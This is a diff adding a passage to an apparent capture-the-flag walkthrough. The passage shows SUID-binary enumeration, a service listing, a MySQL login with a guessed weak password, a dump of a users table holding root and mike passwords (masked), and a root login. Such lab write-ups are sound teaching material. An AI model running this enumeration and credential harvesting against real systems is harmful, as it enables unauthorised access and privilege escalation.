@@ -447,3 +447,142 @@ mike@host2:~$
 
 And we are in host2
 
+
+Lets try finding suid binaries again for privilage escalation:
+
+
+```bash
+mike@host2:~$ find / -type f -perm /4000 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/mount
+/bin/ping
+/bin/su
+/bin/umount
+/bin/fusermount
+/bin/ping6
+```
+
+Nothing we can use.
+
+
+Lets look at the services that are running:
+
+
+```bash
+mike@host2:~$ service --status-all
+ [ - ]  acpid
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  ebtables
+ [ - ]  hwclock.sh
+ [ + ]  iscsid
+ [ - ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ - ]  lxcfs
+ [ - ]  lxd
+ [ - ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ + ]  mysql
+ [ - ]  open-iscsi
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  unattended-upgrades
+```
+Mysql and cron are running lets check them.
+
+Lets firstly try to log in on mysql
+```bash
+mike@host2:~$ mysql --user=mike --password=*********
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4
+Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+
+
+And just trying basic passwords loged me in.
+
+
+```bash
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| accounts           |
++--------------------+
+2 rows in set (0.01 sec)
+
+mysql> use accounts;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++--------------------+
+| Tables_in_accounts |
++--------------------+
+| users              |
++--------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++-------+---------------------+
+| login | password            |
++-------+---------------------+
+| root  | ****************    |
+| mike  | ******************* |
++-------+---------------------+
+2 rows in set (0.00 sec)
+```
+
+And we got passwords now.
+
+Lets log in as root.
+
+
+```bash
+root@host2:~# ls -la
+total 28
+drwx------  4 root root 4096 Jul 19  2021 .
+drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
+lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4096 Jul 15  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Jul 15  2021 .ssh
+-rw-------  1 root root  218 Jul 16  2021 mike.zip
+```
+
+And there is a zip file named mike.zip lets extract that
